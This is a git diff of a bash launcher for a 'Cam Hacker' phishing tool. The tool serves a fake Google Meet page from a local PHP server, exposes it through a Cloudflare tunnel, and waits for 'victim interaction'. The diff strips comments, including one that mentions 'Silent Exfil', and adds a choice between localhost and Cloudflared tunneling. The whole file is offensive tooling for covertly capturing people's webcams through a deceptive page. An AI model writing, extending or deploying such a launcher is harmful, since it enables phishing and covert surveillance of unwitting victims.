@@ -1,12 +1,9 @@
 #!/bin/bash
 
-# Cam Hacker - Phase 2 Launcher (Cloudflare Tunnel + Silent Exfil)
-
 SITE_DIR="sites/google_meet_cam"
 SERVER_DIR=".server/www"
 PORT=8080
 
-# Colors
 RED="\033[1;31m"
 GREEN="\033[1;32m"
 CYAN="\033[1;36m"
@@ -41,15 +38,27 @@ function start_cloudflared() {
     echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
 }
 
-# Execution starts here
 banner
-
 echo -e "${CYAN}[1] Launch Google Meet Cam Hacker${RESET}"
 read -p $'Choose an option: ' opt
 
 if [[ $opt == 1 ]]; then
+    echo -e "${CYAN}Choose tunneling option:${RESET}"
+    echo "[1] Localhost"
+    echo "[2] Cloudflared"
+    read -p $'Your choice: ' tunnel
+
     start_php_server
-    start_cloudflared
+
+    if [[ $tunnel == 1 ]]; then
+        echo -e "${GREEN}[+] Localhost server running. Open http://127.0.0.1:$PORT${RESET}"
+        echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
+    elif [[ $tunnel == 2 ]]; then
+        start_cloudflared
+    else
+        echo -e "${RED}[!] Invalid tunneling option.${RESET}"
+        exit 1
+    fi
 else
     echo -e "${RED}[!] Invalid option${RESET}"
 fi
